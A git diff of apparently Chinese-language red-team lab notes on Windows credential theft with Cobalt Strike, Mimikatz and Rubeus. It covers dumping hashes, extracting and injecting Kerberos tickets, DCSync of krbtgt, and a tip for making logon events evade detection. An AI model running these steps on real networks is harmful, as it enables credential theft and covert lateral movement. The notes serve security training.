@@ -1,5 +1,7 @@
 # Credentials & User Impersonation
 
+1. Credential Theft
+
 net logons将显示当前登录到主机的所有用户
 
 ```
@@ -31,7 +33,20 @@ PID   PPID  Name                         Arch  Session     User
 2656  716   sqlservr.exe                 x64   0           DEV\svc_mssql
 ```
 
-# LogonPasswords
+# Beacon + Mimikatz
+
+在CS中用mimikatz提升权限使用```!```和```@```符号
+
+```!```在运行beacon命令之前提升到system权限，如
+```
+beacon> mimikatz !lsadump::sam
+```
+
+```@```impersonates Beacon's thread token before running the command
+
+
+
+# LogonPasswords(NTLM Hashes)
 
 导出内存中的密码，有可能出现明文密码，但是可能性比较小。需要本地管理员权限
 ```
@@ -44,7 +59,7 @@ beacon> mimikatz sekurlsa::logonpasswords
 logonpasswords
 ```
 
-# eKeys
+# eKeys(Kerberos Encryption Keys)
 
 这个 Mimikatz 模块将转储 Kerberos 加密密钥。
 
@@ -108,6 +123,113 @@ MsCacheV2 : 673e2fe26e26e79c58379168b79890f6
 ```
 
 可以使用hashcat破解上面的哈希，例子见[这里](https://hashcat.net/wiki/doku.php?id=example_hashes)
+
+
+# Extracting Kerberos Tickets
+
+从内存中提取TGT
+
+
+列出内存中的TGT
+```
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe triage
+
+Action: Triage Kerberos Tickets (All Users)
+
+[*] Current LUID    : 0x3e7
+
+ ------------------------------------------------------------------------------------------------------------------ 
+ | LUID    | UserName                     | Service                                       | EndTime               |
+ ------------------------------------------------------------------------------------------------------------------ 
+ | 0x462eb | jking @ DEV.CYBERBOTIC.IO    | krbtgt/DEV.CYBERBOTIC.IO                      | 5/12/2021 12:34:03 AM |
+ | 0x25ff6 | bfarmer @ DEV.CYBERBOTIC.IO  | krbtgt/DEV.CYBERBOTIC.IO                      | 5/12/2021 12:33:41 AM |
+ ------------------------------------------------------------------------------------------------------------------
+```
+
+使用 ```/service``` 和 ```/luid```参数限制提取的TGT的数量和类型
+```
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe dump /service:krbtgt /luid:0x462eb /nowrap
+```
+
+使用```createnetonly ```命令创建一个登陆会话，并且记下新的LUID
+```
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
+
+[*] Action: Create Process (/netonly)
+[*] Showing process : False
+[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
+[+] ProcessID       : 4872
+[+] LUID            : 0x92a8c
+```
+
+现在使用ptt，指定LUID，把tiket传递到指定会话中
+```
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
+
+[*] Action: Import Ticket
+[*] Target LUID: 0x92a8c
+[+] Ticket successfully imported!
+```
+
+窃取该进程的访问令牌并访问目标资源
+
+```
+beacon> steal_token 4872
+[+] Impersonated NT AUTHORITY\SYSTEM
+
+beacon> ls \\srv-2\c$
+
+ Size     Type    Last Modified         Name
+ ----     ----    -------------         ----
+          dir     02/10/2021 04:11:30   $Recycle.Bin
+          dir     02/10/2021 03:23:44   Boot
+          dir     10/18/2016 01:59:39   Documents and Settings
+          dir     02/23/2018 11:06:05   PerfLogs
+          dir     05/06/2021 09:49:35   Program Files
+          dir     02/10/2021 02:01:55   Program Files (x86)
+          dir     05/10/2021 09:52:08   ProgramData
+          dir     10/18/2016 02:01:27   Recovery
+          dir     03/29/2021 12:15:45   System Volume Information
+          dir     02/17/2021 18:32:08   Users
+          dir     05/06/2021 09:50:19   Windows
+ 379kb    fil     01/28/2021 07:09:16   bootmgr
+ 1b       fil     07/16/2016 13:18:08   BOOTNXT
+ 256mb    fil     05/11/2021 13:17:32   pagefile.sys
+```
+
+
+# DCSync
+
+前提是有DCSync的能力
+
+执行DCSync，难道krbtgt的哈希
+```
+beacon> make_token DEV\nlamb F3rrari
+
+beacon> dcsync dev.cyberbotic.io DEV\krbtgt
+[DC] 'dev.cyberbotic.io' will be the domain
+[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
+[DC] 'DEV\krbtgt' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : krbtgt
+
+Credentials:
+  Hash NTLM: 9fb924c244ad44e934c390dc17e02c3d
+    ntlm- 0: 9fb924c244ad44e934c390dc17e02c3d
+    lm  - 0: 207d5e08551c51892309c0cf652c353b
+    
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : DEV.CYBERBOTIC.IOkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e
+      aes128_hmac       (4096) : 6fb62ed56c7de778ca5e4fe6da6d3aca
+      des_cbc_md5       (4096) : 629189372a372fda
+```
+
+
 
 
 # Make Token
@@ -293,6 +415,85 @@ beacon> kill 6284
 [+] host called home, sent: 12 bytes
 ```
 
+# Pass the Ticket
+
+ptt是一种允许您将 Kerberos 票证添加到您有权访问的现有登录会话 (LUID) 或您创建的新登录会话的技术（Pass the ticket is a technique that allows you add Kerberos tickets to an existing logon session (LUID) that you have access to, or a new one you create）
+
+首先创建一个新的空会话，该会话没有票据
+```
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
+
+[*] Action: Create Process (/netonly)
+
+[*] Using random username and password.
+
+[*] Showing process : False
+[*] Username        : GJB9A2GP
+[*] Domain          : VPY1XQRP
+[*] Password        : R4ABN1K3
+[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
+[+] ProcessID       : 4748
+[+] LUID            : 0x798c2c
+```
+
+
+记住上面会话的LUID是：```0x798c2c```
+
+执行ptt，把票据注入到上面的会话
+```
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x798c2c /ticket:doIFuj[...snip...]lDLklP
+
+[*] Action: Import Ticket
+[*] Target LUID: 0x798c2c
+[+] Ticket successfully imported!
+```
+
+使用Rubeus triage命令现在可以看到这个LUID
+```
+ | 0x798c2c | jking @ DEV.CYBERBOTIC.IO    | krbtgt/DEV.CYBERBOTIC.IO                      | 9/1/2022 5:29:20 PM |
+```
+
+
+最后一步，使用```steal_token ```命令窃取上面的进程会话.假如这里是4748
+```
+beacon> steal_token 4748
+
+beacon> ls \\web.dev.cyberbotic.io\c$
+[*] Listing: \\web.dev.cyberbotic.io\c$\
+
+ Size     Type    Last Modified         Name
+ ----     ----    -------------         ----
+          dir     08/15/2022 18:50:13   $Recycle.Bin
+          dir     08/10/2022 04:55:17   $WinREAgent
+          dir     08/10/2022 05:05:53   Boot
+          dir     08/18/2021 23:34:55   Documents and Settings
+          dir     08/19/2021 06:24:49   EFI
+          dir     08/15/2022 18:58:09   inetpub
+          dir     05/08/2021 08:20:24   PerfLogs
+          dir     08/24/2022 11:02:25   Program Files
+          dir     08/10/2022 04:06:16   Program Files (x86)
+          dir     08/31/2022 17:40:32   ProgramData
+          dir     08/15/2022 18:31:08   Recovery
+          dir     08/30/2022 11:16:24   System Volume Information
+          dir     08/30/2022 17:51:08   Users
+          dir     08/30/2022 20:19:27   Windows
+ 427kb    fil     08/10/2022 05:00:07   bootmgr
+ 1b       fil     05/08/2021 08:14:33   BOOTNXT
+ 12kb     fil     09/01/2022 07:26:41   DumpStack.log.tmp
+ 384mb    fil     09/01/2022 07:26:41   pagefile.sys
+
+```
+
+**OPSEC**
+
+> 默认情况下，Rubeus 将使用 CreateProcessWithLogonW 的随机用户名、域和密码，这将出现在相关的 4624 登录事件中。“可疑登录事件”保存的搜索将显示 4624，其中TargetOutboundDomainName不是预期值。
+
+我们可以在命令行上提供这些选项，以使字段看起来不那么异常。密码不必是用户的实际密码
+
+```
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dev.cyberbotic.io /username:bfarmer /password:FakePass123
+```
+
 
 # Overpass the Hash
 
@@ -432,74 +633,3 @@ beacon> ls \\srv-2\c$
 ```
 
 
-# Extracting Kerberos Tickets
-
-从内存中提取TGT
-
-
-列出内存中的TGT
-```
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe triage
-
-Action: Triage Kerberos Tickets (All Users)
-
-[*] Current LUID    : 0x3e7
-
- ------------------------------------------------------------------------------------------------------------------ 
- | LUID    | UserName                     | Service                                       | EndTime               |
- ------------------------------------------------------------------------------------------------------------------ 
- | 0x462eb | jking @ DEV.CYBERBOTIC.IO    | krbtgt/DEV.CYBERBOTIC.IO                      | 5/12/2021 12:34:03 AM |
- | 0x25ff6 | bfarmer @ DEV.CYBERBOTIC.IO  | krbtgt/DEV.CYBERBOTIC.IO                      | 5/12/2021 12:33:41 AM |
- ------------------------------------------------------------------------------------------------------------------
-```
-
-使用 ```/service``` 和 ```/luid```参数限制提取的TGT的数量和类型
-```
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe dump /service:krbtgt /luid:0x462eb /nowrap
-```
-
-使用```createnetonly ```命令创建一个登陆会话，并且记下新的LUID
-```
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
-
-[*] Action: Create Process (/netonly)
-[*] Showing process : False
-[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
-[+] ProcessID       : 4872
-[+] LUID            : 0x92a8c
-```
-
-现在使用ptt，指定LUID，把tiket传递到指定会话中
-```
-execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
-
-[*] Action: Import Ticket
-[*] Target LUID: 0x92a8c
-[+] Ticket successfully imported!
-```
-
-窃取该进程的访问令牌并访问目标资源
-
-```
-beacon> steal_token 4872
-[+] Impersonated NT AUTHORITY\SYSTEM
-
-beacon> ls \\srv-2\c$
-
- Size     Type    Last Modified         Name
- ----     ----    -------------         ----
-          dir     02/10/2021 04:11:30   $Recycle.Bin
-          dir     02/10/2021 03:23:44   Boot
-          dir     10/18/2016 01:59:39   Documents and Settings
-          dir     02/23/2018 11:06:05   PerfLogs
-          dir     05/06/2021 09:49:35   Program Files
-          dir     02/10/2021 02:01:55   Program Files (x86)
-          dir     05/10/2021 09:52:08   ProgramData
-          dir     10/18/2016 02:01:27   Recovery
-          dir     03/29/2021 12:15:45   System Volume Information
-          dir     02/17/2021 18:32:08   Users
-          dir     05/06/2021 09:50:19   Windows
- 379kb    fil     01/28/2021 07:09:16   bootmgr
- 1b       fil     07/16/2016 13:18:08   BOOTNXT
- 256mb    fil     05/11/2021 13:17:32   pagefile.sys
-```
